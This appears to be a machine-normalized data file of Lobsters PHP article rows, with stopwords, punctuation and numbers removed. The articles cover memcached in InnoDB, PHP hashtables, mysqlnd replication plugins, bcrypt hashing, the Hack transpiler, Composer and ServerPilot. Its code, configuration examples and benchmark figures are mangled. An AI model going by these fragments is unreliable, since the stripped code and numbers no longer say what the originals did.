use definitely improve code introducing memcachememcached apis possibly large performance win little work writing replication memcache pool memcached known ease setting memcached pool load balancing high availability innodb memcache interface somewhat similar behavior available standard mysql replication slave used readonly memcached server however rule readwrite splitting applies memcache read writes could ensure use mysqlndmemcache plugin access memcached pool pair mysqlndms plugin handle readwrite splitting however mean miss high performance memcached interface writes way indicate memcache extension server readonly would possible use standard masterslaves replication topology memcached pool conclusion innodb memcached interface much faster way using mysql simple keyvalue store still backed reliability persistence excellent innodb table engine typically quite fast actual memcached allows eliminate another moving part infrastructure gaining persistence dropin replacement memcached additionally drastic innodb memcached engine performance gain upcoming mysql release especially larger multicore system next part series look query caching performance gain p using memcached would consider using innodb memcached interface add persistence currently accessing innodb memcached interface love hear experience
226,Lobsters,php,PHP programming,PHP's new hashtable implementation,https://nikic.github.io/2014/12/22/PHPs-new-hashtable-implementation.html,php new hashtable implementation,analyzing memory usage array introduction hashtables hashtable open addressing old hashtable implementation hashtable chapter new zval implementation new hashtable implementation order element hashtable lookup packed hashtables empty hashtables memory utilization performance closing thought,three year ago wrote article analyzing memory usage array php part work upcoming php large part zend engine rewritten focus smaller data structure requiring fewer allocation article provide overview new hashtable implementation show efficient previous implementation measure memory utilization using following script test creation array distinct integer startmemory memorygetusage array range echo memorygetusage startmemory bytesn following table show result using php php system bit bit php mib mib php mib mib word array php use time le memory quite impressive introduction hashtables essence php array ordered dictionary ie represent ordered list keyvalue pair keyvalue mapping implemented using hashtable hashtable ubiquitous data structure essentially solves problem computer directly represent continuous integerindexed array whereas programmer often want use string complex type key concept behind hashtable simple string key run hashing function return integer integer used index normal array problem two different string result hash number possible string virtually infinite hash limited integer size hashtables need implement kind collision resolution mechanism two primary approach collision resolution open addressing element stored different index collision occurs chaining element hashing index stored linked list php us latter mechanism typically hashtables explicitly ordered order element stored underlying array depends hashing function fairly random behavior consistent semantics php array iterate php array get back element exact order inserted mean php hashtable implementation support additional mechanism remembering order array element old hashtable implementation provide short overview old hashtable implementation comprehensive explanation please see hashtable chapter php internals book following graphic highlevel view php hashtable look like element collision resolution chain referred bucket every bucket individually allocated image gloss actual value stored bucket key shown value stored separately allocated zval structure byte byte large another thing image show collision resolution list actually doubly linked list simplifies deletion element next collision resolution list another doubly linked list storing order array element array containing key b c order list could look follows old hashtable structure inefficient term memory usage performance number primary factor bucket require separate allocation allocation slow additionally require byte allocation overhead separate allocation also mean bucket spread memory reduce cache efficiency zvals also require separate allocation slow incurs allocation header overhead furthermore requires u store pointer zval bucket old implementation overly generic actually needed one two pointer two doubly linked list require total four pointer per bucket alone take byte furthermore traversing linked list cacheunfriendly operation new hashtable implementation try solve least ameliorate problem new zval implementation getting actual hashtable like take quick look new zval structure highlight differs old one zval struct defined follows struct zvalstruct zendvalue value union struct zenduchar type zenduchar typeflags zenduchar constflags zenduchar reserved v typeinfo union varflags next hash collision chain cacheslot literal cache slot lineno line number ast node safely ignore macro definition present ensure predictable memory layout across machine different endianness zval structure three part first member value zendvalue union byte large store different kind value including integer string array etc actually stored depend zval type second part byte typeinfo consists actual type like isstring isarray well number additional flag providing information type eg zval storing object type flag would say nonconstant refcounted garbagecollectible noncopying type last byte zval structure normally unused really explicit padding compiler would introduce automatically otherwise however special context space used store extra information eg ast node use store line number vm constant use store cache slot index hashtables use store next element collision resolution chain last part important u compare previous zval implementation one difference particularly stand new zval structure longer store refcount reason behind zvals longer individually allocated instead zval directly embedded whatever storing eg hashtable bucket zvals longer use refcounting complex data type like string array object resource still use effectively new zval design pushed refcount information cyclecollector zval arrayobjectetc number advantage approach listed following zvals storing simple value like booleans integer float longer require allocation save allocation header overhead improves performance avoiding unnecessary allocs free improving cache locality zvals storing simple value need store refcount gc root buffer avoid double refcounting eg previously object used zval refcount additional object refcount necessary support byobject passing semantics complex value embed refcount shared independently zval mechanism particular also possible share string important hashtable implementation longer need copy noninterned string key new hashtable implementation preliminary behind u finally look new hashtable implementation used php let start looking bucket structure typedef struct bucket zendulong h zendstring key zval val bucket bucket entry hashtable contains pretty much would expect hash h string key key zval value val integer key stored h key hash identical case case key member null see zval directly embedded bucket structure allocated separately pay allocation overhead main hashtable structure interesting typedef struct hashtable ntablesize ntablemask nnumused nnumofelements zendlong nnextfreeelement bucket ardata arhash dtorfunct pdestructor ninternalpointer union struct zenduchar flag zenduchar napplycount reserve v flag u hashtable bucket array element stored ardata array array allocated power two size stored ntablesize minimum value actual number stored element nnumofelements note array directly contains bucket structure previously used array pointer separately allocated bucket mean needed allocfrees pay allocation overhead also pay extra pointer order element ardata array store element order insertion first array element stored ardata second ardata etc way depend used key order insertion matter store five element hashtable slot ardata ardata used next free slot ardata remember number nnumused may wonder store separately nnumofelements long insertion operation performed element deleted hashtable obviously want move element ardata occur deleted element order continuous array instead simply mark deleted value isundef zval type example consider following code array foo bar xyz unset array unset array xyz result following ardata structure ntablesize nnumofelements nnumused key foo valint key bar valint valundef valundef valint initialized initialized initialized see first five ardata element used element position key key xyz replaced isundef tombstone unset element remain wasted memory however nnumused reach ntablesize php try compact ardata array dropping undef entry added along way bucket really contain value ardata reallocated twice size new way maintaining array order several advantage doubly linked list used php one obvious advantage save two pointer per bucket corresponds byte additionally mean iterating array look roughly follows ht nnumused bucket b ht ardata zisundef b val continue stuff bucket corresponds linear scan memory much cacheefficient linked list traversal go back forth relatively random memory address one problem current implementation ardata never shrink unless explicitly told create array million element remove afterwards array still take lot memory probably half ardata size utilization fall certain level hashtable lookup discussed php array represent order actual hashtable lookup us second arhash array consists value arhash array size ntablesize ardata actually allocated one chunk memory hash returned hashing function string key unsigned integer large directly use index hash array first need adjust table size using modulus operation instead hash ht ntablesize use hash ht ntablesize size power two require expensive integer division value ht ntablesize stored ht ntablemask next look index idx ht arhash hash ht ntablemask hash array index corresponds head collision resolution list ht ardata idx first entry examine key stored match one looking done otherwise must continue next element collision resolution list index element stored bucket normally unused last four byte zval structure get special meaning context continue traversing linked list us index instead pointer either find right bucket hit invalididx mean element given key exist code lookup mechanism look like zendulong h zendstringhashval key idx ht arhash h ht ntablemask idx invalididx bucket b ht ardata idx b h h zendstringequals b key key return b idx znext b val b return null let consider approach improves previous implementation php collision resolution used doubly linked pointer list using index instead pointer better take half size system additionally fitting byte mean embed next link unused zval slot essentially get free also use singly linked list prev link anymore prev link primarily useful deleting element adjust next link prev element perform deletion however deletion happens key already know previous element result traversing collision resolution list case deletion occurs context eg delete element iterator currently traverse collision list find previous element rather unimportant scenario prefer saving memory saving list traversal case packed hashtables php us hashtables array however rather common case continuous integerindexed array ie real array whole hashing thing make much sense php introduces concept packed hashtables packed hashtables arhash array null lookup directly index ardata looking key element located ardata exist need traverse collision resolution list note even integer indexed array php maintain order array packed hashtable optimization work key ascending order gap key continuous need always increase element inserted array wrong order eg reverse packed hashtable optimization used note furthermore packed hashtables still store lot useless information example determine index bucket based memory address bucket h redundant value bucket key always null wasted memory well keep useless value around bucket always structure independently whether packing used mean iteration always use code however might switch fully packed structure future pure zval array used possible empty hashtables empty hashtables get bit special treating php php create empty array chance pretty good actually insert element ardataarhash array allocated first element inserted hashtable avoid checking special case many place small trick used ntablesize set either hinted size default value ntablemask usually ntablesize set zero mean hash ht ntablemask always result value zero well arhash array case need one element index zero contains invalididx value special array called uninitializedbucket allocated statically lookup performed always find invalididx value mean key found exactly want empty table memory utilization cover important aspect php hashtable implementation first let summarize new implementation us le memory use number system look perelement size ignoring main hashtable structure le significant asymptotically php whopping byte per element required php value byte byte packed case difference come zvals individually allocated save byte allocation overhead bucket individually allocated save another byte allocation overhead zvals byte smaller simple value keeping order longer need byte doubly linked list instead order implicit collision list singly linked save byte furthermore index list index embedded zval effectively save another byte zval embedded bucket longer need store pointer due detail previous implementation actually save two pointer another byte length key longer stored bucket another byte however key actually string integer length still stored zendstring structure exact memory impact case hard quantify zendstring structure shared whereas previously hashtables copy string interned array containing collision list head index based save byte per element packed array necessary case save another byte however clearly said summary making thing look better really several respect first new hashtable implementation us lot embedded opposed separately allocated structure negatively affect thing look actually measured number start article find php array element took mib memory case dealing packed array would actually expect mib memory utilization reason behind allocate everything power two ntablesize case allocate byte memory mib course previous hashtable implementation also used power two allocation however allocated array bucket pointer way pointer byte everything else allocated demand php loose mib unused memory php waste mib another thing consider happens value stored array distinct simplicity let assume value array identical let replace range starting example arrayfill startmemory memorygetusage array arrayfill echo memorygetusage startmemory bytesn script result following number bit bit php mib mib php mib mib see memory usage php stay range case reason would change zvals separate php hand memory usage significantly lower one zval used value still good bit better php difference smaller thing become even complicated consider string key may shared interned complex value point array php take significantly le memory php number introduction likely optimistic many case performance already talked lot memory usage let move next point namely performance end goal phpng project improve memory usage improve performance memory utilization improvement mean end le memory result better cpu cache utilization resulting better performance however course number reason new implementation faster first need le allocation depending whether value shared save two allocation per element allocation rather expensive operation quite significant array iteration particular cachefriendly linear memory traversal instead randomaccess linked list traversal probably lot said topic performance main interest article memory usage go detail closing thought php undoubtedly made big step forward far hashtable implementation concerned lot useless overhead gone question go one idea already mentioned use fully packed hash case increasing integer key would mean using plain zval array best without starting specialize uniformly typed array probably direction one could go well example switching collisionchaining open addressing eg using robin hood probing could better term memory usage collision resolution list performance better cache efficiency depending detail probing algorithm however openaddressing relatively hard combine ordering requirement may possible reasonable way another idea combine h key field bucket structure integer key use h string key already store hash key well however would likely adverse impact performance fetching hash require additional memory indirection one last thing wish mention php improved internal representation hashtables also api used work regularly look even simple operation like zendhashfind used especially regarding many level indirection required hint three php write zendhashfind ht key get back zval generally find writing extension php become quite bit pleasant hopefully able provide insight internals php hashtables maybe write followup article focusing zvals already touched difference post lot said topic
227,Lobsters,php,PHP programming,Advanced MySQL Scaling with PHP's MySQLnd,https://blog.engineyard.com/2014/advanced-read-write-splitting-with-phps-mysqlnd,advanced mysql scaling php mysqlnd,part one series multiple configuration note failover note transaction filter replication lag eventual consistency dependant faster network session consistency note partitioning sharding custom routing conclusion cache support distributed transaction mysql fabric support,part one series took first look mysqlndms mysqlnd plugin readwrite splitting article look advanced usage multiple configuration keen eyed reader part one may noticed mysqlndms configuration toplevel key named example appname contains configuration allows specify multiple configuration one configuration file appspecifickey master slave specify configuration use use key hostname connect using mysqli mysqli new mysqli appname user password dbname using pdo pdo new pdo mysql hostappname dbnamedbname user password note need even one configuration otherwise mysqlndms configuration used failover mysqlndms plugin allows automatic failover connection fail trying connect server happens transparently issuing first query disabled default issue state eg sql user variable however easy set setting failoverstrategy configuration option option three possible value disabled never failover automatically default master always failover master loopbeforemaster slave request attempted first loop slave trying master appname master slave failover strategy loopbeforemaster addition setting strategy additionally set two setting rememberfailed setting tell plugin remember failed server remainder session default false recommended maxretries number retries attempted server considering failed server tried per iteration list removed failing n time default mean unlimited server never removed conflict rememberfailed configuration option appname master slave failover strategy loopbeforemaster rememberfailed true maxretries note transaction discussed failover implicitly disabled transaction one pitfall splitting query load balancing multiple read server transaction could end different query hitting different server particular issue call insertupdatedelete want select modified data set completing transaction solve either use mysqlndmsmasterswitch mysqlndmslastusedswitch sql hint using mysqli pdo let plugin automatically track transaction latter must either turn autocommit start transaction end hook transaction method first need setup plugin configuration enable sticky transaction use autocommit mysqli extension mysqli autocommit false disable autocommit implicitly start transaction mysqli query begin query mysqli query commit rollback mysqli autocommit true enable autocommit pdo extension pdo setattribute pdo attrautocommit false disable autocommit implicitly start transaction pdo exec begin query pdo exec commit rollback pdo setattribute pdo attrautocommit true disable autocommit plugin also track begin transaction commit rollback method extension send request master call pdo begintransaction mysqli begintransaction pdo commit pdo rollback mysqli commit mysqli rollback end transaction filter mysqlndms support filter chain determining server ultimately used execute query two type filter multi filter return list master slave server one ultimately picked single filter return single server specify multiple multi filter multiple single filter one passed result previous filter filter executed order defined configuration file must end single filter typically one load balancing filter random randomonce roundrobin user replication lag first filter look quality service qos multi filter one primary reason use mysqlndmslastusedswitch sql hint send read master write occurred affected replication lag otherwise use slave distribute load also possible achieve transparently using masteronwrite configuration setting appname master slave masteronwrite however would mean remaining query request go master necessary query unaffected write triggered switch newer version mysqlndms tried solve qos filter feature allows granular come handling replication lag writethenread scenario three type service level eventual consistency default mastersslaves considered read query additionally automatically filter slave lag n second behind master session consistency similar however additionally automatically include server already replicated data using global transaction id gtids strong consistency used using multimaster synchronous mysql setup example mysql cluster configure mysqlndms either add filter config appname master slave filter qualityofservice typeofconsistency option value random also set programmatically using mysqlndmssetqos connection mysqlndmsqosconsistency type mysqlndmsqosoption option value eventual consistency simplest eventual consistency transparently check secondsbehindmaster value slave le equal accepted value considered read candidate however value increment whole second mean still caught replication lag issue also dependant faster network eventual consistency tell mysqlndms consider slave within n second master configure plugin either use config appname master slave filter qualityofservice eventualconsistency age mysqlndmssetqos connection mysqlndmsqosconsistencyeventual mysqlndmsqosoptionage set plugin consider node le equal one second behind master session consistency session consistency ensure use server definitely sync master slower provides robust solution eventual consistency session consistency achives using global transaction id gtids mysql mysql support serverside gtids plugin use automatically preferred solution using older version mysql gtids enabled need implement clientside gtids discussed manual gtids may available mysql plugin fallback master configure plugin use appname master slave filter qualityofservice sessionconsistency globaltransactionidinjection select select globalgtidexecuted fetchlastgtid select globalgtidexecuted trxid dual checkforgtid select gtidsubset gtid globalgtidexecuted trxid dual reporterrors true case add new section configuration globaltransactionidinjection tell plugin query use check gtid server note query work mysql plugin check consider server selects insync master type query still use master add additional section configuration function setting masteronwrite earlier possible set additional configuration programmatically however enable masteronwrite behavior using mysqlndmssetqos mysqli mysqlndmsqosconsistencysession partitioning sharding due fact hard scale writes multiple machine eg multimaster replication traditional mysql ie mysql cluster fairly common use partitioning sharding enable scale across multiple master writing different data set one example user profile data might master shopping cart transaction might master b partitioning sharding done scale writes however sometimes replication topology choose replicate subset master database specific slave allows scale hardware effectively around specific data set mysqlndms plugin allows setup multiple master using mysqlndmsmultimaster ini setting partitioning using nodegroups multi filter unlike lot feature mysqlndms partitioning entirely transparent process partition must determined either writing query editor programmatically running query require enable multimaster support add following phpini setup node group add following json configuration appname master host db dbname host db dbname slave host db dbname host db dbname filter nodegroups groupa master slave groupb master slave add two node group groupa groupb using slave one master route query specific node group adding sql hint containing name beginning query groupa select user chain sql hint like groupb mslastused select transaction prepend sql hint mentioned editor writing code programmatically constructing query custom routing final feature cover custom routing allows write logic determining server query routed done using user usermulti filter filter must define callback must return either single server list master slave server respectively callback must function static object method call type callable closure however wrapper around object code feature able programmatically detect edge case might otherwise missed default mechanism first let setup configuration appname master slave filter user selectdbserver next define callback function function selectdbserver connection sql master slave lastused intransaction always switch master last used inarray master lastused return lastused always use last used connection transaction intransaction true return lastused check sql hint strpos sql mysqlndmsmasterswitch false force master return arrayrand master use arrayrand case multiple master elseif strpos sql mysqlndmsslaveswitch false force slave return arrayrand slave elseif strpos sql mysqlndmslastusedswitch false force last used return lastused check edgecases allow query start select select go slave stripos sql select stripos sql select select remember already transaction lastused used pcrematch select outfiledumpfile sql return arrayrand master return arrayrand slave send create temporary table lastused stripos sql create temporary table return lastused pick one server end default master return arrayrand master please note example probably used production however illustrates power user filter number check ultimately arrive server used much like masteronwrite flag session consistency qos filter switch master future query master used next ensure respect transaction use last used connection currently transaction check follow sql hint finally get edgecases query starting select query create temporary table query nothing else returned simply default master ensures le likely send write query slave accident anything like within function long return one server alternatively use usermulti filter identical except would return array two value array master slave server respectively conclusion mysqlndms plugin lot advanced feature allow effectively scale application much easily using traditional mysql replication topology still feature covered cache support distributed transaction mysql fabric support next installment series take look mysql innodb memcache interface well easily transparently utilize another mysqlnd plugin mysqlndmemcache p using advanced technique already love hear experience mysqlndms plugin via twitter reddit
228,Lobsters,php,PHP programming,Easy Read/Write Splitting with PHP’s MySQLnd,https://blog.engineyard.com/2014/easy-read-write-splitting-php-mysqlnd/,easy readwrite splitting php mysqlnd,installation mysql native driver plugins readwrite splitting configuration load balancing routing query conclusion second installment,mysql always default goto database server pairing goto database since almost inception language sure people use postgresql sql server oracle web workload mysql usually relational database choice due mostly part easy get going libmysqlclient bundled php relicensed gpl change meant longer possible bundle php removed made compilation process php slightly difficult requiring libmysqlclient available host system given widespread nature php fact popular single language use mysql ideal oracle sun came agreement build mysql native php licensed contribution php would allow access mysql without libmysqlclient mysql native drive mysqlnd added php default since php though still compile libmysqlclient brings extra feature better performance better memory usage libmysqlclient mysql manual mysqlnd library using php internal c infrastructure seamless integration php addition using php memory management php stream io abstraction php string handling routine use php memory management mysqlnd allows example memory saving using readonly variable copy write make mysqlnd apply php memory limit additionally plugin architecture number plugins available installation install compile one three mysql extension instance explicitly specify path libmysqlclient library three library extpdomysql since php extmysqli since php extmysql since php deprecated since php note install extmysql extmysqli extpdomysql enabled automatically select extension choosingone following configure flag withmysql withmysqli withpdomysql using debian ubuntu easily install package sudo aptget install remove libmysqlclientbased package includes three extension mysql native driver plugins aside performance benefit biggest benefit mysqlnd plugins plugins available via pecl installed easily using pecl install mysqlnd name available stable plugins mysqlndmemcache transparently translate sql use mysql memcacheprotocol compatible nosql daemon mysqlndms easily perform readwrite splitting master slave m server simple load balancing mysqlndqc add simple query cache php mysqlnduh allows writing mysqlnd plugins php plugins mysqlnd apply three extension readwrite splitting useful plugin mysqlndms masterslave plugin allows somewhat read writes different server configuration installed using pecl need configure phpini mysqlndms configuration file phpini mysqlndmsini debianlike system extensionmysqlndmsso mysqlndmsconfigfilepathtomysqlndmsjson need create mysqlndmsjson file file defines master slave server well readwrite splitting load balancing strategy setup configuration going depend replication topology simplest configuration file includes one master one slave appname master host mastermysqlhost port user dbuser password dbpassword db dbname slave host slavemysqlhost port user dbuser password dbpassword db dbname required setting host others optional load balancing additionally mysqlndms simple load balancing one several strategy random slave picked read query random random slave picked first read query reused remainder request round new slave picked read query order defined userspecified callback determines slave called query important understand unless use last strategy maintain state every single request execute load balancing strategy isolation roundrobin applies query within request one server picked per request sequential order might expect actual hardware software load balancer mind would recommend youdo use load balancing aspect plugin instead use actual load balancer simply point configuration load balancer slave routing query default mysqlndms transparently route query starting select slave server anything else master good bad transparent mean zero change code also simplistic analyze query ensure actually readonly query send query start select master also send write query using select slave could disaster luckily plugin includes ability hint server query sent done placing one three sql hint constant query statement master statement slave statement whichever server last used three constant simple placeholder string msmaster msslave mslastused respectively however string may change future therefore constant used use sql hint add comment query whichever one wish use easiest way use sprintf replace placeholder case string placeholder given argument example send select master sql sprintf select tablename mysqlndmsmasterswitch send nonselect slave sql sprintf create temporary table temptablename select tablename mysqlndmsslaveswitch last hint let ensure connection used previous query particularly useful ensuring switch reading master data modified potentially yet replicated performing transaction include read write statement request ispost form isvalid user setvalues form getvalues user save sql sprintf select usersession userid userid mysqlndlastusedswitch use master query master previously used case master used user data updated user save conclusion mysqlndms plugin incredibly useful especially want move large legacy application using distributed readwrite perfect get way application without changing single line code second installment series look advanced usage mysqlndms plugin p working vanilla mysql php app want try method share experience thought
229,Lobsters,php,PHP programming,Password Security: The Anatomy of a Hash,https://blog.engineyard.com/2014/password-security-part-3,password security anatomy hash,part one part two hash character june twofactor authentication rsa secureid google authenticator conclusion maninthemiddle seen trivial ensuring password security,part one series password security looked using bcrypt part two looked implement php ruby ruby rail third part take look result applying bcrypt algorithm hash hash hash made multiple part part allow determine setting used create hash thereby allowing validate without needing additional information prefix identifies bcrypt used version followed cost salt character finally hashed text june version cryptblowfish released fixed bug handling nonascii character causing insecure password able identify potentially buggy known buggy correct hash two prefix introduced potentially buggy known buggy hash using corrected version ruby gem suffer bug support prefix also support validation prefix compatibility php support three prefix passwordhash output correct hash using prefix validate hash backwards compatibility passwordneedsrehash function return rehash convert correct version twofactor authentication definitely using bcrypt storage password also using twofactor authentication tandem increased security relies secondary authentication mechanism addition password password something user know secondary authentication mechanism could something user device issue timebased token something user type thing biometrics measure biometrics commonly used web application focus timebased token traditionally would something like rsa secureid device keyring sized gadget generates display new token every second user enter upon login token derived shared secret server device know knowing current time server figure token currently displayed recently seen addition numerous option including soft token google authenticator mobile phone app push notification twitter app io sm based verification whereby code sent user known cell phone number via sm input one way another attempt verify user posession something mobile phone token generator conclusion responsible application developer owe user keep information safe using ssl avoid sending data eg password plain text mitigate maninthemiddle mitm attack enough hashing password using bcrypt preferably adding twofactor authentication apps seen using bcrypt trivial number language using bcrypt ensuring password security two main attack vector dictionary attack brute force attack user trust u personal information must show trust wellfounded p still using series post convinced change implementing use mechanism keeping user safe love hear
231,Lobsters,php,PHP programming,Password Security Part 1: By The Numbers,https://blog.engineyard.com/2014/password-security-part-1,password security part number,bcrypt blowfish cipher scrypt attacking password rainbow table key stretching hashing speed compared talk conclusion next installment,claim security expert especially cryptography expert pretty confident password security relying work actual expert instead implementing stress important general principle come complex topic like information security cryptography talking password best practice changed lot short amount time quickly went plain text maybe salt still putting user risk current best practice bcrypt algorithm based blowfish cipher specifically designed password hashing good option include scrypt however bcrypt considered superior password threepart series take close look bcrypt comparing common solution implement role play keeping user safe attacking password two main attack vector need mitigate dictionary attack brute force attack way work simple use pregenerated list password hash simple comparison find string creates hash want nonsalted password huge pregenerated list password download take simple lookup list known rainbow table using salt using unique one password attacker generate rainbow table manually using salt every combination lookup however use unique salt every password need generate list every combination every individual password type attack brute forcing come play brute force attack work trying guess password unlike slow hash like bcrypt scrypt sibling etc password hash meant message digest algorithm mean meant quickly verify given message tampered common example verifying downloaded file download file run file compare hash one supplied original site keyword however quickly quick enemy security come brute force algorithm designed password typically want make application run quickly possible one case thing made intentionally slower using bcrypt supply cost ensure take longer compute hash known key stretching make brute forcing expensive term time computational resource attacker hashing speed compared talk jeremi gosney us commodity hardware compare performance various hashing algorithm setup us five server consumer graphic card hd hd dual gpu hd dual gpu hd result follows algorithm hashessecond bcrypt billionsecond faster faster faster billionsecond slower faster faster slower slower faster bcrypt slower slower slower given advance hardware expect see huge drop cost using hardware today approximately increase performance using equivalent today hardware number astounding feel bear repeating still using unsalted nonuniquely salted password attacker setup make guess per second even best sha algorithm time slower allows guess per second bcrypt hand cost factor five allows guess per second slower slower even slower consumer hardware important note achieving utlizing builtin secure mechanism algorithm rolling solution conclusion seen many attempt password security simply thing like performing five iteration attempt slow brute force attempt still brings number attempt twice slow single still faster slower bcrypt bcrypt great solution hashing password effective combatting brute force dictionary attack next installment look actually use bcrypt php ruby project p current password hashing solution language implementing using bcrypt
232,Lobsters,php,PHP programming,Announcing the Hack Transpiler,https://code.facebook.com/posts/398235553660954/announcing-the-hack-transpiler/,announcing hack transpiler,collection short lambda expression challenge implementation literal syntax documentation provided try,today proud announce first experimental release hh hack transpiler tool allows project converted php hack still make release target php language since launch hack many community member asked u manage forward compatibility hack backwardscompatible php running php hhvm hack code seamlessly integrate inverse true project converted hack way run hack code engine anyone want use project need able run hhvm run hack code leave dust existing user able make leap whatever reason something established project willing major major release good reason hack language close php reasonable ask mechanically convert hack back php erasing type annotation easy hack much type system contains many feature collection short lambda expression simply erased order get back valid php furthermore tool would inferior experience using hack directly hhvm team want converted code canonical way hack used hoped would able find better solution problem one would run aforementioned issue spent last couple month building combination command line tool transpiles entire hack project php additional library php function class meant used alongside transpiled output simple use invoked like pathtoinputdir pathtooutputdir along transformed output provide hacklib library included transformed project suggested workflow integrate build step ensure every version hack project provide corresponding php version allow continue working hack version project using latest greatest feature still ensuring user still running engine able run project simplest way understand look simple example hack code transformed tool example erase type annotation original hack code class alice extends person private int height private vector person sibling public function transform transformable item item instanceof potion height return transformed code class alice extends person private height private sibling public function transform item item instanceof potion height return another interesting example must replace short lambda anonymous function list variable captured scope original hack code function wonderland drinkme eatme getfood transform alice alice transform drinkme transform eatme transformed code function wonderland drinkme eatme getfood transform function alice use eatme drinkme return alice transform drinkme transform eatme challenge implementation overarching design goal tool make sure transformed code would always behave exactly untransformed code would provide experimental version tool soon possible community large one simplification chose make first version transpiler make use local information scope transforming code order avoid whole program analysis extensive type checker support still made possible u support hack interesting feature occasion provided challenge supporting collection library one tricky aspect process could simply convert hack collection array since hack collection actually reference semantics rather value semantics hence hacklib provided along tool contains implementation entire collection library transforming hack code using collection merely using equivalent construct hacklib library example hhvm empty hack collection universally convert false used boolean context something standard php object never mean arbitrary expression statement involves boolean comparison cast might invoke special rule involves collection unless expression treated boolean trivially collection treat might potentially contain collection hence cautious making transformation original hack code function chophead subject subject isqueen subject removehead transformed code function chophead subject isqueen could return collection hacklibcastasboolean subject isqueen subject removehead rare case actually choose support feature instance support instance variable using literal syntax class declaration class blah private static vector string vector supported private vector string vector supported reason support construct transformation require u replace literal syntax equivalent call constructor static collection initialized class declaration instance declaration would lie constructor class may always contain constructor may inherit without whole program analysis impossible u know constructor inherited final private parameter course case like silently transpile code fail rather stop yell conversion error file pathtofilephp line character collection initializers instance variable currently supported documentation provided tool highlight support notice list thing support small long run hope support construct finally want emphasize great way maintain compatibility existing installed user release best way work hack daily basis output machinegenerated close enough original source investigating bug report filed people using problem also something intended manually edited edits preserved way use case excels final build step project make backwardscompatible release ideal project convert hack source truth hack contributor work hack daytoday etc run final build step create alternate version release using like existing project get benefit converting hack none drawback leaving existing user behind right still experimental try give u feedback
233,Lobsters,php,PHP programming,Composer: It’s All About the Lock File,https://blog.engineyard.com/2014/composer-its-all-about-the-lock-file,composer lock file,composer know lock file twitter semantic versioning install update zend framework skeleton app deployment conclusion,composer defacto standard package management php simple effective become ubiquitous community everybody know using composer create composerjson file list dependency desired version run composer install done commit composerjson project everyone else team run composer install install project dependency also know want update dependency simply run composer update update currently installed dependency latest version meet composerjson version spec pretty simple however also composerlock file get generated root repository know lock file week ago twitter noticed opencfp project composerlock file repository might say composer install away go get dependency right wrong point lock file record exact version installed reinstalled mean version spec coworker run composer update installs commits composerlock file composer install also get even released ensures everybody working project exact version might thinking proper semantic versioning even backwards compatible still conforms version spec ie major version number changed big deal well unless performing code review every release every dependency dependency forth highly likely sort bug change creep eventually break code human also pretty common project set dependency version rely devmaster meaning pull recent change time mean anything committed since last time composer install done without lock file get new thirdparty code pulled problem concerned code breaking one reason important think composer centered around composerlock file safety device used like one install update people often get confused whether install update start think acting upon lock file instead dependency thing become much easier think running composer install check composerlock exists perform composer update create one composerlock exists install specified version lock file running composer update check composerjson determine latest version install based version spec install latest version update composerlock reflect latest version installed either way running one command commit composerlock version control system ensure collaborator areon page one exception rule case something like zend framework skeleton app dependency update install skeleton app metaapp want grab latest dependency start developing therefore composerlock committed repo deployment composerlock repository composer install deploying ensures dependency used production development also mean composer need dependency resolution version lookup improving deployment performance composerlock file also ensures consistency across cluster server running composer separately machine enables spin new instance week month later without concerned dependency mismatch conclusion see lock file ever wonder whether call composer install composer update let lock file guide associate command apply content lock file dependency go wrong short ever wonder commit composerlock version control answer yes p committing lock file revision control switch love hear thought
234,Lobsters,php,PHP programming,"On Love, Open Source, and Community",https://blog.engineyard.com/2014/on-love-open-course-and-community,love open source community,pitfall phpnw phpwomen prompt jenny wong divide wordpress php community volker dusch keynote awesome nerd,often tell people best job world yes come pitfall work hard play harder people party exotic locale wardrobe conference tshirts bookshelf full swag make amazing love job let love thing important last year since joining engine yard celebrated anniversary phpnw october enabled spend majority time interacting php community way person speaker blogger author open source contributor irc participant twitter sure people read know emigrated uk mean biological family mile time last week phpnw mum made drive leicester manchester come see great course excited see php family phpamily phpamily encompasses wider php community well friend know personal basis within community people share hope dream fear worry share best worst moment life losing first wife adopting son people learn socialize mentor grow peer role community engineer tried best use love grown beyond php much larger community encompassing help guide engine yard way benefit u mean fighting community getting resource support placing health community else role act voice community within engine yard never met community engineer developer advocate whatever title want give love community definitely labor love addition able pursue love php community two thing become near dear heart phpwomen prompt overall goal mind make community healthier case phpwomen making welcoming inclusive woman case prompt tackling health issue prevalent field need discussed often every project worked meaningful way come place love love craft love problem solving love people life help improve love family community know common story people often volunteer time effect change make world better place last month community engineer allowed see best part community also hurt two occasion instance hurt someone attacked something care personally invested remember every time interact people impact emotional state people say attack code person often hard separate thing pour heart good understanding sensitive empathy one important skill open source well life jenny wong spoke passionately phpnw divide wordpress php community volker dusch keynote said every time make fun wordpress developer different type developer make fun right php people poking fun wordpress developer go folk making fun ruby people people month everyone laughing net crowd lot u work open source love mean regularly working thing long thankless usually time family friend love make world better outside behaviour might seem absurd effect change make world better place community population large constructive criticism vital tool thoughtless trash talk individual community important show compassion commonality rather disdain bad feeling minor difference divide u way love way find people love way make nerd awesome wil wheaton awesome nerd hostile others number one way turning people contributing project creates perception usvsthem implicitly excludes anyone already invested project needle say hurt project long run contributes larger feeling open source unwelcoming newcommers welcoming outsider sharing well project benefit everyone bear responsibility make community productive healthy safe fun much learn much improve life others listening respectful idea matter source grow developer reaching outside comfort zone seeking preexisting solution language saying using project true value open source free sharing idea love particular making way obviously community important thank part
235,Lobsters,php,PHP programming,Quickly Deploy LAMP Stacks with ServerPilot,https://longren.io/quick-and-easy-lamp-stack-with-serverpilot/,quickly deploy lamp stack serverpilot,easily deploy lamp stack free serverpilot vps digitalocean serverpilot serverpilot nginx apache php mysql harden ssh little getting started serverpilot google tell sign sign connect server run install gist additional information github serverpilotvagrantfile serverpilotapi serverpilotvagrantfile vagrant readme detailed serverpilotapi documentation readme excellent gist paid account screenshot post jake peterson pricing page end digitalocean linode well work get touch leave feedback leave comment like published twitter google github view post tyler longren published,easily deploy lamp stack free yet use serverpilot setting new vps digitalocean coming week new venture serverpilot make getting lamp stack setup quickly serverpilot automatically install nginx apache php mysql new freshly installedcreated ubuntu ubuntu using digitalocean create droplet ssh able harden ssh little make sure install new package yet getting started getting started serverpilot crazy easy need able ssh server run command highly doubt anyone reading know google tell sign sign free account serverpilot connect server connect new server enter server hostname click continue setup button screenshot run install connect server via ssh remember must new server preferably additional package installed yet install nginx apache php mysql run command gist serverid serverapikey value provided blacked screenshot additional information github serverpilot also github account two repository currently one serverpilotvagrantfile serverpilotapi serverpilotvagrantfile repository provides sample vagrant configuration testing serverpilot basically server use test serverpilot using new paid vps readme 